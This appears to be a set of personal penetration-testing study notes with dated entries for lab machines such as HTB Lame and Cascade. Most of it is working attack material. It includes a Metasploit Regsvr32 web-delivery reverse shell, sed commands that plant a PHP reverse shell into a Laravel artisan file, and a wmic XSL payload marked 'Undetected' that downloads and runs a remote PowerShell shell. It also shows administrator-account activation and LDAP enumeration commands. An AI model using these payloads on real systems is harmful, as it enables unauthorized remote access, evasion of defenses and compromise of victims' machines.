# Quick Notes
------------


## 12 Aug
Windows reverse shell using Regsvr32 and metasploit:
```bash
msfconsole > use multi/script/web_delivery

set payload windows/meterpreter/reverse_tcp

set target 3 (Regsvr32)

run
```
Copy the link  and execute it.

 

```cmd
net user administrator /active:yes
```

Using sed to insert code into specific lines:
```bash
sed -i '4i $sock=fsockopen("10.10.10.10", 443);' artisan
sed -i '5i exec("/bin/sh -i <&3 >&3 2>&3");' artisan
```


-----------

## 13 Aug

ldapsearch get naming contexts

```bash
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.209.122" "(objectclass=*)"
```

```bash
ldapsearch -H ldap://192.168.68.122 -x -b "dc=hutch,dc=offsec" "*"
```

vnc password crack hex 
dnspy stuff 



In samba or apache use symlinks to escape sandbox
```
symlink / x
```

HTB Lame https://www.youtube.com/watch?v=n4aXyQUYCjI

Do Cascade one more time and analyse it fully!


## 14 Aug
---------
AD Restore Object 
https://docs.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject?view=windowsserver2022-ps

Cascade


## 15 Aug
---------
Zerologon!

Another windows reverse shell  using wmic:
Undetected 
```cmd
wmic os get /format:"http://10.10.14.25/wmic.xsl"
```

wmic.xsl:
```xsl
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.137.128/shell.ps1') | powershell -noprofile -");
        ]]>
    </ms:script>
</stylesheet>
```

shell.ps1 is nishang oneliner. 

Make clear notes for ldapsearch



https://notchxor.github.io/oscp-notes/4-win-privesc/15-LFI-FILES/
- [ ] add contents from this
